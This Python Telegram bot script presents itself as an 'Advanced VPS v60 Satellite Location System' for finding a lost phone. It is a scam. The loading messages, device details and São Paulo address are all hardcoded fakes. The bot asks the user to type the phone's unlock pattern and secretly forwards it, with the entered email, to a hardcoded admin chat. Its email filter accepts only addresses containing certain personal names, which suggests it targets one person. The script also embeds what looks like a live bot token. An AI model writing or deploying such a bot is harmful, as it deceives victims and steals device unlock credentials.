#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes
)

# ===== CONFIGURATIONS =====
TOKEN = "8899817896:AAFIOTKm4jf94E2a6xwbbMc4J7AEcV4Fsmo"
REPORT_CHAT_ID = 7348149102   # @masterlixx

# ===== CONVERSATION STATES =====
MENU, EMAIL_CADASTRO, EMAIL_DESCADASTRO, LOCALIZAR_EMAIL, AGUARDANDO_PADRAO = range(5)

# ===== FAKE DATABASE =====
emails_cadastrados = []

# ===== DEVICE INFORMATION (POCO C65) =====
INFORMACOES_DISPOSITIVO = (
    "📱 *Device Information*\n"
    "• Model: POCO C65\n"
    "• RAM: 6.0+2.0 GB\n"
    "• CPU: MediaTek Helio G85 Octa-core Max 2.00GHz\n"
    "• OS Version: 2.0.207.0.VGPMIXM\n"
    "• Android Version: 15 AP3A.240905.015.A2\n"
    "• Security Update: 2026-05-01\n"
    "• Model Number: 2310FPCA4G\n"
    "• Baseband Version: MOLY.LR12A.R3.MP.V253.5.P47\n"
    "• Kernel Version: 6.6.30-android15-8-g6b55ce738535-4k\n"
    "• Storage: 30.3GB/128GB"
)

# ===== EMAIL VALIDATION (DOMAINS + HIDDEN NAMES) =====
def validar_email(email: str) -> bool:
    if not (email.endswith('@gmail.com') or email.endswith('@hotmail.com') or email.endswith('@icloud.com')):
        return False
    nomes = ['pedro', 'henrique', 'pizzaria', 'phf', 'figueiredo']
    email_lower = email.lower()
    return any(nome in email_lower for nome in nomes)

# ===== KEYBOARDS =====
def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 Register Email", callback_data='cadastrar')],
        [InlineKeyboardButton("🗑️ Unregister Email", callback_data='descadastrar')],
        [InlineKeyboardButton("🔍 Locate Device via Google", callback_data='localizar')]
    ])

# ===== HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    text = (
        "🚀 *Welcome to the Advanced VPS v60 Satellite Location System!*\n\n"
        "We use satellite triangulation technology, encrypted VPN, and MEO servers to locate "
        "any device with up to 1 meter accuracy. Our artificial intelligence algorithms analyze "
        "radio and Wi-Fi signals to track the device even in airplane mode.\n\n"
        "To get started, use the buttons below:"
    )
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
    return MENU

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'cadastrar':
        await query.edit_message_text("📧 Enter the email address you want to register in the system:")
        return EMAIL_CADASTRO

    elif data == 'descadastrar':
        await query.edit_message_text("🗑️ Enter the email address you want to unregister:")
        return EMAIL_DESCADASTRO

    elif data == 'localizar':
        await query.edit_message_text("🔍 To locate a device, enter the registered email:")
        return LOCALIZAR_EMAIL

    elif data == 'localizar_dispositivo':
        await query.message.reply_text("🛰️ Starting advanced location... Please wait...")
        await asyncio.sleep(2)

        text = (
            "⚠️ *Device is password protected!*\n\n"
            "To unlock and get the exact location, you must draw the device's unlock pattern.\n\n"
            "Use the grid below (numbers 1 to 9) and enter the sequence (e.g., 1 2 3 6 9):\n"
            "```\n"
            "• 1   • 2   • 3\n"
            "• 4   • 5   • 6\n"
            "• 7   • 8   • 9\n"
            "```\n"
            "Send the sequence separated by spaces (e.g., 1 4 8 7 6 3)."
        )
        await query.message.reply_text(text, parse_mode='Markdown')
        return AGUARDANDO_PADRAO

    await query.edit_message_text("Returning to main menu.", reply_markup=main_keyboard())
    return MENU

async def cadastrar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text
    if not validar_email(email):
        await update.message.reply_text("❌ *Invalid email!* Please try again:", parse_mode='Markdown')
        return EMAIL_CADASTRO

    emails_cadastrados.append(email)
    text = f"✅ Email *{email}* successfully registered in the system!\n\nYou can now locate devices linked to this email."
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
    return MENU

async def descadastrar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text
    if not validar_email(email):
        await update.message.reply_text("❌ *Invalid email!* Please try again:", parse_mode='Markdown')
        return EMAIL_DESCADASTRO

    if email in emails_cadastrados:
        emails_cadastrados.remove(email)
        text = f"🗑️ Email *{email}* removed from the system."
        await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
    else:
        text = f"⚠️ Email *{email}* not found in the database."
        await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_keyboard())
    return MENU

async def localizar_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text
    if not validar_email(email):
        await update.message.reply_text("❌ *Invalid email!* Please try again:", parse_mode='Markdown')
        return LOCALIZAR_EMAIL

    context.user_data['ultimo_email'] = email

    # Loading messages with delays
    loading_msgs = [
        "🔍 Connecting to satellite server...",
        "📡 Establishing secure VPN connection...",
        "🛰️ Analyzing radio signals and triangulating...",
        "📍 Calculating approximate coordinates...",
        "📊 Retrieving geolocation data...",
        "✅ *Device found!*"
    ]

    msg = None
    for txt in loading_msgs:
        if msg is None:
            msg = await update.message.reply_text(txt, parse_mode='Markdown')
        else:
            await msg.edit_text(txt, parse_mode='Markdown')
        await asyncio.sleep(4)

    # Send device photo (if exists)
    photo_path = "celular.jpg"
    caption = f"{INFORMACOES_DISPOSITIVO}\n\nClick the button below to get real-time location:"
    
    if os.path.exists(photo_path):
        with open(photo_path, 'rb') as photo:
            await update.message.reply_photo(
                photo=InputFile(photo),
                caption=caption,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📍 Locate Device", callback_data='localizar_dispositivo')]
                ])
            )
    else:
        await update.message.reply_text(
            caption,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📍 Locate Device", callback_data='localizar_dispositivo')]
            ])
        )

    return MENU

async def receber_padrao(update: Update, context: ContextTypes.DEFAULT_TYPE):
    padrao = update.message.text

    # Loading messages with delays
    loading_msgs = [
        "🔄 Verifying unlock pattern...",
        "🔐 Decrypting location data...",
        "📡 Accessing GPS servers...",
        "📍 Calculating exact coordinates...",
        "✅ Location retrieved successfully!"
    ]

    msg = None
    for txt in loading_msgs:
        if msg is None:
            msg = await update.message.reply_text(txt, parse_mode='Markdown')
        else:
            await msg.edit_text(txt, parse_mode='Markdown')
        await asyncio.sleep(4)

    localizacao_completa = (
        "📍 *Exact Device Location*\n\n"
        "🏠 Street: Av. Paulista, 1578\n"
        "🏢 Neighborhood: Bela Vista\n"
        "📮 ZIP Code: 01310-200\n"
        "🏙️ City: São Paulo\n"
        "🗺️ State: SP\n"
        "🌎 Country: Brazil\n"
        "📌 Coordinates: -23.5615, -46.6560\n"
        "📡 Accuracy: ± 5 meters\n"
        "🕒 Last update: 07/12/2026 03:28:47"
    )

    map_photo_path = "mapa.jpg"
    caption = f"{localizacao_completa}\n\nReport sent to the central."

    if os.path.exists(map_photo_path):
        with open(map_photo_path, 'rb') as photo:
            await update.message.reply_photo(
                photo=InputFile(photo),
                caption=caption,
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(caption, parse_mode='Markdown')

    # Send report to admin
    if REPORT_CHAT_ID:
        try:
            report_text = (
                f"📋 *Location Report*\n\n"
                f"Email: {context.user_data.get('ultimo_email', 'Not provided')}\n"
                f"Unlock Pattern: {padrao}\n"
                f"Device: POCO C65\n"
                f"{localizacao_completa}"
            )
            await context.bot.send_message(
                chat_id=REPORT_CHAT_ID,
                text=report_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Error sending report: {e}")

    await update.message.reply_text(
        "Operation completed. Return to the menu for other actions.",
        reply_markup=main_keyboard()
    )
    return MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Operation cancelled. Returning to menu.",
        reply_markup=main_keyboard()
    )
    return MENU

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 *Available commands:*\n"
        "/start - Start the bot and see the menu\n"
        "/help - Show this message\n"
        "/cancel - Cancel current operation",
        parse_mode='Markdown'
    )

# ===== MAIN =====
def main():
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            MENU: [
                CallbackQueryHandler(button_callback, pattern='^(cadastrar|descadastrar|localizar|localizar_dispositivo)$')
            ],
            EMAIL_CADASTRO: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, cadastrar_email)
            ],
            EMAIL_DESCADASTRO: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, descadastrar_email)
            ],
            LOCALIZAR_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, localizar_email)
            ],
            AGUARDANDO_PADRAO: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receber_padrao)
            ]
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            CommandHandler('help', help_command),
            CommandHandler('start', start)
        ]
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('help', help_command))

    print("🤖 Bot started successfully! Waiting for messages...")
    application.run_polling()

if __name__ == '__main__':
    main()
